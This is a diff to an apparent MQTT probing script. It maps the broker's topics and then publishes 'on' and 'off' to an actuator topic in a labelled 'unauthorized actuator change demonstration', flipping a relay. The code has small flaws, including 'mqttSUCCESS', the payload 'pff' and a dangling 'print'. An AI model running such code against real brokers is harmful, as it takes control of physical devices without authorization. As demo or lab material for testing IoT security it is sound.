@@ -5,7 +5,7 @@ from tkinter import UNDERLINE
 
 
 ERROR = '\033[91m [!!!]\033[0m'
-WARNING = '\033[93m [X]\033[0m'
+WARNING = '\033[93m [*]\033[0m'
 NOTIFICATION = '\033[96m[+]\033[0m'
 COLOUR_END = '\033[0m'
 UNDERLINE = '\033[4m'
@@ -92,8 +92,32 @@ def main():
         print(f"{NOTIFICATION} {msg} messages saved.")
 
     with open(topicMap_File, "w") as f:
-        
-            
+        f.write("MQTT # Map completed")
+        for t in sorted(topicSet):
+            f.write(t + "\n")
+        print(f"{NOTIFICATION} Topic data placed im {topicMap_File}\n")
+        print(f"{NOTIFICATION} {len(topicSet)} topics discovered.")
 
+        print(f"\n{NOTIFICATION} Unauthorized actuator change demonstration beginning on: '{actuatorTopic}'")
+        rc, mid = client.publish(actuatorTopic, payload = "on", qos=0)
+        if rc == mqtt.mqttSUCCESS:
+            print(f"{NOTIFICATION} Published: {actuatorTopic} = on\n")
+            print(f"{NOTIFICATION} RELAY ACTIVE")
+        else: 
+            print(f"{WARNING}Published returned rc={rc}\n")
+            print(f"{UNDERLINE} Reassess broker connection before reattempting.{COLOUR_END}")
 
+        time.sleep(2)
 
+        client.publish(actuatorTopic, payload="pff", qos=0)
+        print(f"{NOTIFICATION} Published: {actuatorTopic} = off \n")
+        print(f"{WARNING}The relay has been reset, aLl changes have been reversed.")
+        time.sleep(1)
+
+        client.loop_stop()
+        client.disconnect()
+
+        print("\n" + "-" * 60)
+        print(f"{NOTIFICATION}Probing complete.")
+        print(f"Refer to {harvestFile} + {topicMap_File} for relevant information")
+        print
